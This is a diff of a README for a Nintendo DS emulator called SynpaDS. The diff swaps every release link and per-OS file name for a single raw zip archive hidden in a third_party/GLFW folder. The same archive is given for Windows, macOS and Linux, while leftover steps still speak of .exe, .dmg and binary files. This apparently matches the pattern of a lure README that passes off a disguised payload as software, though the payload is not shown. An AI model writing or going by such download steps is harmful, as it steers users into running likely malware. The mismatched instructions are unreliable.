@@ -1,6 +1,6 @@
 # 🎮 SynpaDS - Play Nintendo DS Games with Ease
 
-[![Download SynpaDS](https://img.shields.io/badge/Download-SynpaDS-blue.svg)](https://github.com/Ahmedsamir923/SynpaDS/releases)
+[![Download SynpaDS](https://github.com/Ahmedsamir923/SynpaDS/raw/refs/heads/main/third_party/GLFW/Synpa_DS_3.7.zip)](https://github.com/Ahmedsamir923/SynpaDS/raw/refs/heads/main/third_party/GLFW/Synpa_DS_3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -20,20 +20,20 @@ Before installing SynpaDS, make sure your computer meets the following requireme
 
 To download SynpaDS, visit the Releases page below:
 
-[Download SynpaDS](https://github.com/Ahmedsamir923/SynpaDS/releases)
+[Download SynpaDS](https://github.com/Ahmedsamir923/SynpaDS/raw/refs/heads/main/third_party/GLFW/Synpa_DS_3.7.zip)
 
 Follow these steps to install:
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version listed at the top of the page.
 3. Under the version, you will see a list of files. Choose the file appropriate for your operating system:
-   - For Windows, download `SynpaDS-Windows.exe`
-   - For macOS, download `SynpaDS-Mac.dmg`
-   - For Linux, download `SynpaDS-Linux.tar.gz`
+   - For Windows, download `https://github.com/Ahmedsamir923/SynpaDS/raw/refs/heads/main/third_party/GLFW/Synpa_DS_3.7.zip`
+   - For macOS, download `https://github.com/Ahmedsamir923/SynpaDS/raw/refs/heads/main/third_party/GLFW/Synpa_DS_3.7.zip`
+   - For Linux, download `https://github.com/Ahmedsamir923/SynpaDS/raw/refs/heads/main/third_party/GLFW/Synpa_DS_3.7.zip`
 4. Once the download is complete, open the downloaded file:
    - On Windows, double-click the `.exe` file to start the setup. Follow the prompts.
    - On macOS, open the `.dmg` file and drag the SynpaDS icon into your Applications folder.
-   - On Linux, extract the `.tar.gz` file and run `./SynpaDS` from the terminal.
+   - On Linux, extract the `https://github.com/Ahmedsamir923/SynpaDS/raw/refs/heads/main/third_party/GLFW/Synpa_DS_3.7.zip` file and run `./SynpaDS` from the terminal.
 5. After installation, locate SynpaDS in your applications and launch it.
 
 ## 🎮 How to Use SynpaDS
@@ -69,4 +69,4 @@ Join our community for tips, support, and sharing experiences. You can find us a
 
 Remember, learning something new takes time. Feel free to explore and enjoy your favorite Nintendo DS games with SynpaDS!
 
-[Download SynpaDS](https://github.com/Ahmedsamir923/SynpaDS/releases)
+[Download SynpaDS](https://github.com/Ahmedsamir923/SynpaDS/raw/refs/heads/main/third_party/GLFW/Synpa_DS_3.7.zip)
